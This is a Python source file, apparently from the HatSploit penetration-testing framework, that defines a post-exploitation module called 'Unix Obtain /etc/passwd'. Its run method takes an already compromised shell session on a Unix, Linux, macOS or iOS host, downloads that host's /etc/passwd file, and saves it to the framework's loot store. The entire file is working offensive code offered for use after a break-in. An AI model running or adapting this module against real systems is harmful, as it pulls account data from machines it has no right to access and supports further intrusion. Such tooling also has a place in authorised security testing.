#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.lib.sessions import Sessions
from hatsploit.lib.loot import Loot


class HatSploitModule(Module, Sessions):
    details = {
        'Category': "post",
        'Name': "Unix Obtain /etc/passwd",
        'Module': "post/unix/shell/getpasswd",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Get current session /etc/passwd file.",
        'Platform': "unix",
        'Rank': "medium"
    }

    options = {
        'SESSION': {
            'Description': "Session to run on.",
            'Value': None,
            'Type': "session->[unix,linux,macos,apple_ios]",
            'Required': True
        },
        'PATH': {
            'Description': "Path to save file.",
            'Value': Loot().specific_loot('passwd'),
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        session, path = self.parse_options(self.options)
        self.session_download(session, '/etc/passwd', path)
